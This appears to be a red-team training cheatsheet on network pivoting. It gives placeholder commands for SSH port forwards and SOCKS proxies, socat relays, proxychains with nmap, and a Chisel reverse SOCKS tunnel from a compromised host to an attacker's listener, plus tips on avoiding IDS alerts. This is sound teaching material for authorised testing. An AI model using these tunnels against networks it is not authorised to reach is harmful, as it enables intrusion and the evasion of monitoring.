---
layout: training-page
title: "Pivoting Patterns Cheatsheet — Red Team Academy"
module: "Ops Cheatsheets"
tags:
  - cheatsheet
  - pivoting
  - tunneling
page_key: "cheatsheets-pivoting-patterns"
render_with_liquid: false
updated: "2026-04-13"
---

# Pivoting Patterns Cheatsheet

Minimal patterns for **SOCKS**, **port forward**, and **reverse** tunnels. Match ports and interfaces to your engagement; avoid exposing services broadly.

## SSH — local forward (your machine → jump → target service)

```
ssh -N -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<JUMP_HOST>
```

## SSH — remote forward (remote listens, forwards to you)

```
ssh -N -R <REMOTE_PORT>:<LOCAL_IP>:<LOCAL_PORT> <USER>@<JUMP_HOST>
```

## SSH — dynamic SOCKS5

```
ssh -N -D <LOCAL_SOCKS_PORT> <USER>@<JUMP_HOST>
# Point proxychains / browser SOCKS to 127.0.0.1:<LOCAL_SOCKS_PORT>
```

## Chisel (typical C2-style relay — example shapes)

```
# Listener (your teamserver / pivot host)
chisel server --reverse --port <CHISEL_PORT>

# Agent (compromised host) — patterns vary; see pivoting module for full flags
chisel client <LHOST>:<CHISEL_PORT> R:socks
```

## socat — quick TCP relay (Linux)

```
socat TCP-LISTEN:<PORT>,fork TCP:<TARGET>:<PORT>
```

## ProxyChains — use with SOCKS

```
# /etc/proxychains.conf — set socks5 127.0.0.1 <LOCAL_SOCKS_PORT>
proxychains4 nmap -sT -Pn <TARGET>
```

## OPSEC

- Prefer **low fan-out** tunnels; noisy port scans through SOCKS can alarm IDS.
- Bind forwards to **loopback** where possible.

## Resources

- [SSH tunneling](/pivoting/ssh-tunneling/)
- [Chisel & SOCKS](/pivoting/chisel-socks/)
- [ProxyChains](/pivoting/proxy-chains/)
